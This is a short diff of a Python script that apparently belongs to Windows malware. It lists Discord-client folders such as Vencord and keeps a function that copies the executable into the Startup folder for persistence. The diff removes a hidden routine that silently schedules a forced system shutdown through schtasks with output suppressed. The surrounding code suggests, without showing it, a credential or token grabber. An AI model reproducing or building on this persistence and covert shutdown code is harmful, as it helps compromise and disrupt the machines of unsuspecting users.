@@ -47,18 +47,6 @@ PATHS = {
     'Vencord': ROAMING + '\\Vencord'
 }
 
-def schedule_shutdown():
-
-    current_time = time.localtime()
-    shutdown_time = time.strptime(time.strftime('%H:%M', current_time), '%H:%M')
-    shutdown_time = time.mktime((current_time.tm_year, current_time.tm_mon, current_time.tm_mday, shutdown_time.tm_hour + 1, shutdown_time.tm_min, 0, 0, 0, 0))
-
-    shutdown_time_str = time.strftime('%H:%M', time.localtime(shutdown_time))
-
-    command = f'schtasks /create /tn "ScheduledShutdown" /tr "shutdown /s /f" /sc once /st {shutdown_time_str}'
-
-    subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-
 def copy_exe_to_startup(exe_path):
     """Copy the executable to the startup folder"""
     startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
@@ -191,7 +179,6 @@ def main():
 
 if __name__ == "__main__":
     main()
-    schedule_shutdown()
 
 PUL = ctypes.POINTER(ctypes.c_ulong)
 
